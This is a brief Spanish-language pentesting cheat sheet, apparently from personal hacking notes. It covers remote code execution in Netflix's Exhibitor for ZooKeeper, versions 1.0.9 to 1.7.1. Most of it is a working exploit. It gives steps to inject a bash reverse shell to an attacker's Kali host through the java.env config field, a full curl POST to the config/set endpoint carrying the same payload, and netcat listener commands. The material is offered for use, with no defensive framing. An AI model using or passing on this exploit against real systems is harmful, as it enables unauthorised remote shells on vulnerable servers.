# Exhibitor Web Zookeeper 

Tags: #Zookeeper 

**Exhibitor para ZooKeeper** es un sistema de supervisión y gestión creado por Netflix para simplificar la administración de clústeres (_ensembles_) de [Apache ZooKeeper](https://zookeeper.apache.org/), especialmente en entornos de nube dinámicos. Funciona como un proceso supervisor que automatiza tareas complejas.
## Versión 1.0.9 a 1.7.1 

* [RCE](https://www.exploit-db.com/exploits/48654)

```bash 
Paso 1:
Ir al panel de Zookeeper que mayormente se encuentra en el puerto 8080 

Paso 2:
Reemplazar el contenido 'java.env' que se encuentra en el apartado de 'Config' y ativar el editado:
	export JAVA_OPTS="-Xms1000m -Xmx1000m" && $(/bin/bash -i >& /dev/tcp/IP_Kali/443 0>&1 &)

Paso 3:
Dar click en 'Commit' y despues en 'All At Once'
```

```bash 
❯ rlwrap nc -nlvp 443    # Recibir la revershell con Kali 
```

## Forma Manual 

```bash 
# Abre un listener primero
❯ rlwrap nc -nlvp 443

# Luego envía el payload
❯ curl -X POST http://192.168.161.98:8080/exhibitor/v1/config/set \
  -H "Content-Type: application/json" \
  -d '{
    "zookeeperInstallDirectory": "/opt/zookeeper",
    "zookeeperDataDirectory": "/zookeeper/data",
    "zookeeperLogDirectory": "/opt/zookeeper/transactions",
    "logIndexDirectory": "/opt/zookeeper/transactions",
    "autoManageInstancesSettlingPeriodMs": "0",
    "autoManageInstancesFixedEnsembleSize": "0",
    "autoManageInstancesApplyAllAtOnce": "1",
    "observerThreshold": "0",
    "serversSpec": "1:pelican",
    "javaEnvironment": "export JAVA_OPTS=\"-Xms1000m -Xmx1000m\" && $(/bin/bash -i >& /dev/tcp/IP_Kali/443 0>&1 &)",
    "log4jProperties": "",
    "clientPort": "2181",
    "connectPort": "2888",
    "electionPort": "3888",
    "checkMs": "30000",
    "cleanupPeriodMs": "300000",
    "cleanupMaxFiles": "20",
    "backupPeriodMs": "600000",
    "backupMaxStoreMs": "21600000",
    "autoManageInstances": "1",
    "zooCfgExtra": {"tickTime": "2000", "initLimit": "10", "syncLimit": "5", "quorumListenOnAllIPs": "true"},
    "backupExtra": {"directory": ""},
    "serverId": 1
  }'
```